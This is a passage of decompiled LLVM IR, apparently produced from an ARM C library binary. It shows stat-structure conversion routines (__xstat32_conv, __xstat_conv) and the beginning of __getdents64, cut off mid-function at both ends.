  store i32 %v2_17bd4, i32* %v1_17bdc, align 4
  %v3_17bdc = add i32 %v0_17bd8, 76
  %v4_17bdc = inttoptr i32 %v3_17bdc to i32*
  %v5_17bdc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17bdc, i32* %v4_17bdc, align 4
  %v0_17be0 = load i32, i32* %r7.global-to-local, align 4
  %v1_17be0 = load i32, i32* %r5.global-to-local, align 4
  %v2_17be0 = add i32 %v1_17be0, 32
  %v3_17be0 = inttoptr i32 %v2_17be0 to i32*
  store i32 %v0_17be0, i32* %v3_17be0, align 4
  %v0_17be4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17be4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17be4 = add i32 %v1_17be4, 36
  %v3_17be4 = inttoptr i32 %v2_17be4 to i32*
  store i32 %v0_17be4, i32* %v3_17be4, align 4
  %v0_17be8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17be8 = add i32 %v0_17be8, 80
  store i32 %v1_17be8, i32* %r3.global-to-local, align 4
  %v1_17bec = add i32 %v0_17be8, 48
  store i32 %v1_17bec, i32* %r7.global-to-local, align 4
  %v1_17bf0 = inttoptr i32 %v1_17bec to i32*
  %v2_17bf0 = load i32, i32* %v1_17bf0, align 4
  store i32 %v2_17bf0, i32* %r7.global-to-local, align 4
  %v3_17bf0 = add i32 %v0_17be8, 52
  %v4_17bf0 = inttoptr i32 %v3_17bf0 to i32*
  %v5_17bf0 = load i32, i32* %v4_17bf0, align 4
  store i32 %v5_17bf0, i32* %r8.global-to-local, align 4
  %v1_17bf4 = inttoptr i32 %v1_17be8 to i32*
  %v2_17bf4 = load i32, i32* %v1_17bf4, align 4
  %v3_17bf4 = add i32 %v0_17be8, 84
  %v4_17bf4 = inttoptr i32 %v3_17bf4 to i32*
  %v5_17bf4 = load i32, i32* %v4_17bf4, align 4
  store i32 %v5_17bf4, i32* %r1.global-to-local, align 4
  %v1_17bf8 = add i32 %v0_17be8, 16
  %v2_17bf8 = inttoptr i32 %v1_17bf8 to i32*
  %v3_17bf8 = load i32, i32* %v2_17bf8, align 4
  store i32 %v3_17bf8, i32* %r2.global-to-local, align 4
  %v0_17bfc = load i32, i32* %r5.global-to-local, align 4
  %v1_17bfc = add i32 %v0_17bfc, 80
  %v1_17c00 = inttoptr i32 %v1_17bfc to i32*
  store i32 %v2_17bf4, i32* %v1_17c00, align 4
  %v3_17c00 = add i32 %v0_17bfc, 84
  %v4_17c00 = inttoptr i32 %v3_17c00 to i32*
  %v5_17c00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c00, i32* %v4_17c00, align 4
  %v0_17c04 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c04 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c04 = add i32 %v1_17c04, 48
  %v3_17c04 = inttoptr i32 %v2_17c04 to i32*
  store i32 %v0_17c04, i32* %v3_17c04, align 4
  %v0_17c08 = load i32, i32* %r8.global-to-local, align 4
  %v1_17c08 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c08 = add i32 %v1_17c08, 52
  %v3_17c08 = inttoptr i32 %v2_17c08 to i32*
  store i32 %v0_17c08, i32* %v3_17c08, align 4
  %v0_17c0c = load i32, i32* %r2.global-to-local, align 4
  %v1_17c0c = load i32, i32* %r5.global-to-local, align 4
  %v2_17c0c = add i32 %v1_17c0c, 16
  %v3_17c0c = inttoptr i32 %v2_17c0c to i32*
  store i32 %v0_17c0c, i32* %v3_17c0c, align 4
  %v0_17c10 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c10 = add i32 %v0_17c10, 88
  store i32 %v1_17c10, i32* %r3.global-to-local, align 4
  %v1_17c14 = add i32 %v0_17c10, 20
  %v2_17c14 = inttoptr i32 %v1_17c14 to i32*
  %v3_17c14 = load i32, i32* %v2_17c14, align 4
  store i32 %v3_17c14, i32* %r2.global-to-local, align 4
  %v1_17c18 = inttoptr i32 %v1_17c10 to i32*
  %v2_17c18 = load i32, i32* %v1_17c18, align 4
  %v3_17c18 = add i32 %v0_17c10, 92
  %v4_17c18 = inttoptr i32 %v3_17c18 to i32*
  %v5_17c18 = load i32, i32* %v4_17c18, align 4
  store i32 %v5_17c18, i32* %r1.global-to-local, align 4
  %v1_17c1c = add i32 %v0_17c10, 64
  store i32 %v1_17c1c, i32* %r6.global-to-local, align 4
  %v1_17c20 = inttoptr i32 %v1_17c1c to i32*
  %v2_17c20 = load i32, i32* %v1_17c20, align 4
  store i32 %v2_17c20, i32* %r6.global-to-local, align 4
  %v3_17c20 = add i32 %v0_17c10, 68
  %v4_17c20 = inttoptr i32 %v3_17c20 to i32*
  %v5_17c20 = load i32, i32* %v4_17c20, align 4
  store i32 %v5_17c20, i32* %r7.global-to-local, align 4
  %v0_17c24 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c24 = add i32 %v0_17c24, 88
  store i32 %v1_17c24, i32* %r3.global-to-local, align 4
  %v2_17c28 = add i32 %v0_17c24, 20
  %v3_17c28 = inttoptr i32 %v2_17c28 to i32*
  store i32 %v3_17c14, i32* %v3_17c28, align 4
  %v0_17c2c = load i32, i32* %ip.global-to-local, align 4
  %v1_17c2c = load i32, i32* %r5.global-to-local, align 4
  %v2_17c2c = add i32 %v1_17c2c, 24
  %v3_17c2c = inttoptr i32 %v2_17c2c to i32*
  store i32 %v0_17c2c, i32* %v3_17c2c, align 4
  %v0_17c30 = load i32, i32* %lr.global-to-local, align 4
  %v1_17c30 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c30 = add i32 %v1_17c30, 28
  %v3_17c30 = inttoptr i32 %v2_17c30 to i32*
  store i32 %v0_17c30, i32* %v3_17c30, align 4
  %v0_17c34 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c34 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c34 = add i32 %v1_17c34, 64
  %v3_17c34 = inttoptr i32 %v2_17c34 to i32*
  store i32 %v0_17c34, i32* %v3_17c34, align 4
  %v0_17c38 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c38 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c38 = add i32 %v1_17c38, 68
  %v3_17c38 = inttoptr i32 %v2_17c38 to i32*
  store i32 %v0_17c38, i32* %v3_17c38, align 4
  %v0_17c3c = load i32, i32* %r3.global-to-local, align 4
  %v1_17c3c = inttoptr i32 %v0_17c3c to i32*
  store i32 %v2_17c18, i32* %v1_17c3c, align 4
  %v3_17c3c = add i32 %v0_17c3c, 4
  %v4_17c3c = inttoptr i32 %v3_17c3c to i32*
  %v5_17c3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c3c, i32* %v4_17c3c, align 4
  %v2_17c40 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17c40, i32* %r4.global-to-local, align 4
  ret i32 %v2_17c18

; uselistorder directives
  uselistorder i32 %v0_17c10, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17be8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 104, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_17c48 = load i32, i32* @r4, align 4
  store i32 %v3_17c48, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_17c60 = inttoptr i32 %arg2 to i8*
  %v3_17c60 = call i32 @__GI_memset(i8* %v2_17c60, i32 0)
  %v2_17c64 = load i32, i32* %arg1, align 4
  %v3_17c64 = add i32 %tmp, 4
  %v4_17c64 = inttoptr i32 %v3_17c64 to i32*
  %v5_17c64 = load i32, i32* %v4_17c64, align 4
  store i32 %v5_17c64, i32* %r4.global-to-local, align 4
  %v0_17c68 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c68 = inttoptr i32 %v0_17c68 to i32*
  store i32 %v2_17c64, i32* %v1_17c68, align 4
  %v3_17c68 = add i32 %v0_17c68, 4
  %v4_17c68 = inttoptr i32 %v3_17c68 to i32*
  %v5_17c68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17c68, i32* %v4_17c68, align 4
  %v0_17c6c = load i32, i32* %r5.global-to-local, align 4
  %v1_17c6c = add i32 %v0_17c6c, 32
  %v1_17c70 = inttoptr i32 %v1_17c6c to i32*
  %v2_17c70 = load i32, i32* %v1_17c70, align 4
  %v3_17c70 = add i32 %v0_17c6c, 36
  %v4_17c70 = inttoptr i32 %v3_17c70 to i32*
  %v5_17c70 = load i32, i32* %v4_17c70, align 4
  store i32 %v5_17c70, i32* %r4.global-to-local, align 4
  %v1_17c74 = add i32 %v0_17c6c, 96
  %v2_17c74 = inttoptr i32 %v1_17c74 to i32*
  %v3_17c74 = load i32, i32* %v2_17c74, align 4
  store i32 %v3_17c74, i32* %r2.global-to-local, align 4
  %v1_17c78 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c78 = add i32 %v1_17c78, 32
  %v3_17c78 = inttoptr i32 %v2_17c78 to i32*
  store i32 %v2_17c70, i32* %v3_17c78, align 4
  %v0_17c7c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c7c = load i32, i32* %r6.global-to-local, align 4
  %v2_17c7c = add i32 %v1_17c7c, 36
  %v3_17c7c = inttoptr i32 %v2_17c7c to i32*
  store i32 %v0_17c7c, i32* %v3_17c7c, align 4
  %v0_17c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c80 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c80 = add i32 %v1_17c80, 12
  %v3_17c80 = inttoptr i32 %v2_17c80 to i32*
  store i32 %v0_17c80, i32* %v3_17c80, align 4
  %v0_17c84 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c84 = add i32 %v0_17c84, 48
  %v2_17c84 = inttoptr i32 %v1_17c84 to i32*
  %v3_17c84 = load i32, i32* %v2_17c84, align 4
  %v1_17c88 = add i32 %v0_17c84, 24
  store i32 %v1_17c88, i32* %ip.global-to-local, align 4
  %v1_17c8c = inttoptr i32 %v1_17c88 to i32*
  %v2_17c8c = load i32, i32* %v1_17c8c, align 4
  store i32 %v2_17c8c, i32* %ip.global-to-local, align 4
  %v3_17c8c = add i32 %v0_17c84, 28
  %v4_17c8c = inttoptr i32 %v3_17c8c to i32*
  %v5_17c8c = load i32, i32* %v4_17c8c, align 4
  store i32 %v5_17c8c, i32* %lr.global-to-local, align 4
  %v1_17c90 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c90 = add i32 %v1_17c90, 44
  %v3_17c90 = inttoptr i32 %v2_17c90 to i32*
  store i32 %v3_17c84, i32* %v3_17c90, align 4
  %v0_17c94 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c94 = add i32 %v0_17c94, 64
  %v2_17c94 = inttoptr i32 %v1_17c94 to i32*
  %v3_17c94 = load i32, i32* %v2_17c94, align 4
  %v1_17c98 = add i32 %v0_17c94, 56
  %v2_17c98 = inttoptr i32 %v1_17c98 to i32*
  %v3_17c98 = load i32, i32* %v2_17c98, align 4
  store i32 %v3_17c98, i32* %r2.global-to-local, align 4
  %v1_17c9c = load i32, i32* %r6.global-to-local, align 4
  %v2_17c9c = add i32 %v1_17c9c, 52
  %v3_17c9c = inttoptr i32 %v2_17c9c to i32*
  store i32 %v3_17c94, i32* %v3_17c9c, align 4
  %v0_17ca0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ca0 = load i32, i32* %r6.global-to-local, align 4
  %v2_17ca0 = add i32 %v1_17ca0, 48
  %v3_17ca0 = inttoptr i32 %v2_17ca0 to i32*
  store i32 %v0_17ca0, i32* %v3_17ca0, align 4
  %v0_17ca4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17ca4 = add i32 %v0_17ca4, 72
  %v1_17ca8 = inttoptr i32 %v1_17ca4 to i32*
  %v2_17ca8 = load i32, i32* %v1_17ca8, align 4
  %v3_17ca8 = add i32 %v0_17ca4, 76
  %v4_17ca8 = inttoptr i32 %v3_17ca8 to i32*
  %v5_17ca8 = load i32, i32* %v4_17ca8, align 4
  store i32 %v5_17ca8, i32* %r1.global-to-local, align 4
  %v0_17cac = load i32, i32* %r6.global-to-local, align 4
  %v1_17cac = add i32 %v0_17cac, 56
  %v1_17cb0 = inttoptr i32 %v1_17cac to i32*
  store i32 %v2_17ca8, i32* %v1_17cb0, align 4
  %v3_17cb0 = add i32 %v0_17cac, 60
  %v4_17cb0 = inttoptr i32 %v3_17cb0 to i32*
  %v5_17cb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17cb0, i32* %v4_17cb0, align 4
  %v0_17cb4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17cb4 = add i32 %v0_17cb4, 80
  %v1_17cb8 = inttoptr i32 %v1_17cb4 to i32*
  %v2_17cb8 = load i32, i32* %v1_17cb8, align 4
  %v3_17cb8 = add i32 %v0_17cb4, 84
  %v4_17cb8 = inttoptr i32 %v3_17cb8 to i32*
  %v5_17cb8 = load i32, i32* %v4_17cb8, align 4
  store i32 %v5_17cb8, i32* %r1.global-to-local, align 4
  %v0_17cbc = load i32, i32* %r6.global-to-local, align 4
  %v1_17cbc = add i32 %v0_17cbc, 64
  %v1_17cc0 = inttoptr i32 %v1_17cbc to i32*
  store i32 %v2_17cb8, i32* %v1_17cc0, align 4
  %v3_17cc0 = add i32 %v0_17cbc, 68
  %v4_17cc0 = inttoptr i32 %v3_17cc0 to i32*
  %v5_17cc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17cc0, i32* %v4_17cc0, align 4
  %v0_17cc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17cc4 = add i32 %v0_17cc4, 16
  %v2_17cc4 = inttoptr i32 %v1_17cc4 to i32*
  %v3_17cc4 = load i32, i32* %v2_17cc4, align 4
  %v1_17cc8 = load i32, i32* %r6.global-to-local, align 4
  %v2_17cc8 = add i32 %v1_17cc8, 16
  %v3_17cc8 = inttoptr i32 %v2_17cc8 to i32*
  store i32 %v3_17cc4, i32* %v3_17cc8, align 4
  %v0_17ccc = load i32, i32* %r5.global-to-local, align 4
  %v1_17ccc = add i32 %v0_17ccc, 88
  %v1_17cd0 = add i32 %v0_17ccc, 20
  %v2_17cd0 = inttoptr i32 %v1_17cd0 to i32*
  %v3_17cd0 = load i32, i32* %v2_17cd0, align 4
  store i32 %v3_17cd0, i32* %r2.global-to-local, align 4
  %v1_17cd4 = inttoptr i32 %v1_17ccc to i32*
  %v2_17cd4 = load i32, i32* %v1_17cd4, align 4
  %v3_17cd4 = add i32 %v0_17ccc, 92
  %v4_17cd4 = inttoptr i32 %v3_17cd4 to i32*
  %v5_17cd4 = load i32, i32* %v4_17cd4, align 4
  store i32 %v5_17cd4, i32* %r1.global-to-local, align 4
  %v0_17cd8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17cd8 = add i32 %v0_17cd8, 72
  %v1_17cdc = inttoptr i32 %v1_17cd8 to i32*
  store i32 %v2_17cd4, i32* %v1_17cdc, align 4
  %v3_17cdc = add i32 %v0_17cd8, 76
  %v4_17cdc = inttoptr i32 %v3_17cdc to i32*
  %v5_17cdc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17cdc, i32* %v4_17cdc, align 4
  %v0_17ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ce0 = load i32, i32* %r6.global-to-local, align 4
  %v2_17ce0 = add i32 %v1_17ce0, 20
  %v3_17ce0 = inttoptr i32 %v2_17ce0 to i32*
  store i32 %v0_17ce0, i32* %v3_17ce0, align 4
  %v0_17ce4 = load i32, i32* %ip.global-to-local, align 4
  %v1_17ce4 = load i32, i32* %r6.global-to-local, align 4
  %v2_17ce4 = add i32 %v1_17ce4, 24
  %v3_17ce4 = inttoptr i32 %v2_17ce4 to i32*
  store i32 %v0_17ce4, i32* %v3_17ce4, align 4
  %v0_17ce8 = load i32, i32* %lr.global-to-local, align 4
  %v1_17ce8 = load i32, i32* %r6.global-to-local, align 4
  %v2_17ce8 = add i32 %v1_17ce8, 28
  %v3_17ce8 = inttoptr i32 %v2_17ce8 to i32*
  store i32 %v0_17ce8, i32* %v3_17ce8, align 4
  %v2_17cec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17cec, i32* %r4.global-to-local, align 4
  ret i32 %v2_17cd4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 96, { 4, 5, 6, 7, 8, 1, 2, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_17d10 = inttoptr i32 %arg2 to i8*
  %v3_17d10 = call i32 @__GI_memset(i8* %v2_17d10, i32 0)
  %v1_17d14 = add i32 %tmp, 4
  %v2_17d14 = inttoptr i32 %v1_17d14 to i32*
  %v3_17d14 = load i32, i32* %v2_17d14, align 4
  %v2_17d18 = load i32, i32* %arg1, align 4
  store i32 %v2_17d18, i32* %r8.global-to-local, align 4
  %v1_17d1c = load i32, i32* %r5.global-to-local, align 4
  %v2_17d1c = add i32 %v1_17d1c, 12
  %v3_17d1c = inttoptr i32 %v2_17d1c to i32*
  store i32 %v3_17d14, i32* %v3_17d1c, align 4
  %v0_17d20 = load i32, i32* %r4.global-to-local, align 4
  %v1_17d20 = add i32 %v0_17d20, 20
  %v2_17d20 = inttoptr i32 %v1_17d20 to i32*
  %v3_17d20 = load i32, i32* %v2_17d20, align 4
  %v1_17d24 = add i32 %v0_17d20, 16
  %v2_17d24 = inttoptr i32 %v1_17d24 to i32*
  %v3_17d24 = load i32, i32* %v2_17d24, align 4
  store i32 %v3_17d24, i32* %r6.global-to-local, align 4
  %v1_17d28 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d28 = add i32 %v1_17d28, 44
  %v3_17d28 = inttoptr i32 %v2_17d28 to i32*
  store i32 %v3_17d20, i32* %v3_17d28, align 4
  %v0_17d2c = load i32, i32* %r4.global-to-local, align 4
  %v1_17d2c = add i32 %v0_17d2c, 24
  %v2_17d2c = inttoptr i32 %v1_17d2c to i32*
  %v3_17d2c = load i32, i32* %v2_17d2c, align 4
  %v1_17d30 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d30 = add i32 %v1_17d30, 48
  %v3_17d30 = inttoptr i32 %v2_17d30 to i32*
  store i32 %v3_17d2c, i32* %v3_17d30, align 4
  %v0_17d34 = load i32, i32* %r4.global-to-local, align 4
  %v1_17d34 = add i32 %v0_17d34, 28
  %v2_17d34 = inttoptr i32 %v1_17d34 to i32*
  %v3_17d34 = load i32, i32* %v2_17d34, align 4
  %v1_17d38 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d38 = add i32 %v1_17d38, 52
  %v3_17d38 = inttoptr i32 %v2_17d38 to i32*
  store i32 %v3_17d34, i32* %v3_17d38, align 4
  %v0_17d3c = load i32, i32* %r4.global-to-local, align 4
  %v1_17d3c = add i32 %v0_17d3c, 32
  %v1_17d40 = inttoptr i32 %v1_17d3c to i32*
  %v2_17d40 = load i32, i32* %v1_17d40, align 4
  %v3_17d40 = add i32 %v0_17d3c, 36
  %v4_17d40 = inttoptr i32 %v3_17d40 to i32*
  %v5_17d40 = load i32, i32* %v4_17d40, align 4
  store i32 %v5_17d40, i32* %r1.global-to-local, align 4
  %v0_17d44 = load i32, i32* %r5.global-to-local, align 4
  %v1_17d44 = add i32 %v0_17d44, 56
  %v1_17d48 = inttoptr i32 %v1_17d44 to i32*
  store i32 %v2_17d40, i32* %v1_17d48, align 4
  %v3_17d48 = add i32 %v0_17d44, 60
  %v4_17d48 = inttoptr i32 %v3_17d48 to i32*
  %v5_17d48 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17d48, i32* %v4_17d48, align 4
  %v0_17d4c = load i32, i32* %r4.global-to-local, align 4
  %v1_17d4c = add i32 %v0_17d4c, 40
  %v1_17d50 = inttoptr i32 %v1_17d4c to i32*
  %v2_17d50 = load i32, i32* %v1_17d50, align 4
  %v3_17d50 = add i32 %v0_17d4c, 44
  %v4_17d50 = inttoptr i32 %v3_17d50 to i32*
  %v5_17d50 = load i32, i32* %v4_17d50, align 4
  store i32 %v5_17d50, i32* %r1.global-to-local, align 4
  %v0_17d54 = load i32, i32* %r5.global-to-local, align 4
  %v1_17d54 = add i32 %v0_17d54, 64
  %v1_17d58 = inttoptr i32 %v1_17d54 to i32*
  store i32 %v2_17d50, i32* %v1_17d58, align 4
  %v3_17d58 = add i32 %v0_17d54, 68
  %v4_17d58 = inttoptr i32 %v3_17d58 to i32*
  %v5_17d58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17d58, i32* %v4_17d58, align 4
  %v0_17d5c = load i32, i32* %r4.global-to-local, align 4
  %v1_17d5c = add i32 %v0_17d5c, 48
  %v1_17d60 = inttoptr i32 %v1_17d5c to i32*
  %v2_17d60 = load i32, i32* %v1_17d60, align 4
  %v3_17d60 = add i32 %v0_17d5c, 52
  %v4_17d60 = inttoptr i32 %v3_17d60 to i32*
  %v5_17d60 = load i32, i32* %v4_17d60, align 4
  store i32 %v5_17d60, i32* %r1.global-to-local, align 4
  %v1_17d64 = add i32 %v0_17d5c, 8
  %v2_17d64 = inttoptr i32 %v1_17d64 to i16*
  %v3_17d64 = load i16, i16* %v2_17d64, align 2
  %v4_17d64 = zext i16 %v3_17d64 to i32
  store i32 %v4_17d64, i32* %r2.global-to-local, align 4
  %v1_17d68 = add i32 %v0_17d5c, 10
  %v2_17d68 = inttoptr i32 %v1_17d68 to i16*
  %v3_17d68 = load i16, i16* %v2_17d68, align 2
  %v4_17d68 = zext i16 %v3_17d68 to i32
  store i32 %v4_17d68, i32* %ip.global-to-local, align 4
  %v1_17d6c = add i32 %v0_17d5c, 12
  %v2_17d6c = inttoptr i32 %v1_17d6c to i16*
  %v3_17d6c = load i16, i16* %v2_17d6c, align 2
  %v4_17d6c = zext i16 %v3_17d6c to i32
  store i32 %v4_17d6c, i32* %lr.global-to-local, align 4
  %v1_17d70 = add i32 %v0_17d5c, 14
  %v2_17d70 = inttoptr i32 %v1_17d70 to i16*
  %v3_17d70 = load i16, i16* %v2_17d70, align 2
  %v4_17d70 = zext i16 %v3_17d70 to i32
  store i32 %v4_17d70, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_17d7c = load i32, i32* %r5.global-to-local, align 4
  %v1_17d7c = add i32 %v0_17d7c, 72
  %v1_17d80 = inttoptr i32 %v1_17d7c to i32*
  store i32 %v2_17d60, i32* %v1_17d80, align 4
  %v3_17d80 = add i32 %v0_17d7c, 76
  %v4_17d80 = inttoptr i32 %v3_17d80 to i32*
  %v5_17d80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17d80, i32* %v4_17d80, align 4
  %v0_17d84 = load i32, i32* %r5.global-to-local, align 4
  %v1_17d84 = inttoptr i32 %v0_17d84 to i32*
  %v2_17d84 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_17d84, i32* %v1_17d84, align 4
  %v3_17d84 = add i32 %v0_17d84, 4
  %v4_17d84 = inttoptr i32 %v3_17d84 to i32*
  %v5_17d84 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_17d84, i32* %v4_17d84, align 4
  %v0_17d88 = load i32, i32* %r6.global-to-local, align 4
  %v1_17d88 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d88 = add i32 %v1_17d88, 32
  %v3_17d88 = inttoptr i32 %v2_17d88 to i32*
  store i32 %v0_17d88, i32* %v3_17d88, align 4
  %v0_17d8c = load i32, i32* %r7.global-to-local, align 4
  %v1_17d8c = load i32, i32* %r5.global-to-local, align 4
  %v2_17d8c = add i32 %v1_17d8c, 36
  %v3_17d8c = inttoptr i32 %v2_17d8c to i32*
  store i32 %v0_17d8c, i32* %v3_17d8c, align 4
  %v0_17d90 = load i32, i32* %r2.global-to-local, align 4
  %v1_17d90 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d90 = add i32 %v1_17d90, 16
  %v3_17d90 = inttoptr i32 %v2_17d90 to i32*
  store i32 %v0_17d90, i32* %v3_17d90, align 4
  %v0_17d94 = load i32, i32* %ip.global-to-local, align 4
  %v1_17d94 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d94 = add i32 %v1_17d94, 20
  %v3_17d94 = inttoptr i32 %v2_17d94 to i32*
  store i32 %v0_17d94, i32* %v3_17d94, align 4
  %v0_17d98 = load i32, i32* %lr.global-to-local, align 4
  %v1_17d98 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d98 = add i32 %v1_17d98, 24
  %v3_17d98 = inttoptr i32 %v2_17d98 to i32*
  store i32 %v0_17d98, i32* %v3_17d98, align 4
  %v0_17d9c = load i32, i32* %r4.global-to-local, align 4
  %v1_17d9c = load i32, i32* %r5.global-to-local, align 4
  %v2_17d9c = add i32 %v1_17d9c, 28
  %v3_17d9c = inttoptr i32 %v2_17d9c to i32*
  store i32 %v0_17d9c, i32* %v3_17d9c, align 4
  ret i32 %v2_17d60

; uselistorder directives
  uselistorder i32 %v0_17d5c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 72, { 10, 4, 5, 6, 7, 0, 11, 1, 2, 3, 8, 9 }
  uselistorder i32 68, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_17db0 = load i32, i32* @r4, align 4
  %v6_17db0 = load i32, i32* @r5, align 4
  %v12_17db0 = load i32, i32* @r7, align 4
  %v1_17db4 = add i32 %arg3, 14
  %v2_17dbc = ptrtoint i32* %stack_var_-72 to i32
  %v1_17dc0 = and i32 %v1_17db4, -8
  %v2_17dc4 = sub i32 %v2_17dbc, %v1_17dc0
  %v1_17dc8 = add i32 %v2_17dc4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_17dc8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_17e04, label %dec_label_pc_17df0

dec_label_pc_17df0:                               ; preds = %entry
  %v0_17df0 = call i32 @__GI___errno_location()
  %v0_17df4 = load i32, i32* %r4.global-to-local, align 4
  %v1_17df4 = sub i32 0, %v0_17df4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17dfc = inttoptr i32 %v0_17df0 to i32*
  store i32 %v1_17df4, i32* %v2_17dfc, align 4
  %v0_17e0c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17e0c

dec_label_pc_17e04:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17e0c, label %dec_label_pc_17e14

dec_label_pc_17e0c:                               ; preds = %dec_label_pc_17e04, %dec_label_pc_17df0
  %v0_17e0c = phi i32 [ -1, %dec_label_pc_17e04 ], [ %v0_17e0c.pre, %dec_label_pc_17df0 ]
  store i32 %v0_17e0c, i32* %r1.global-to-local, align 4
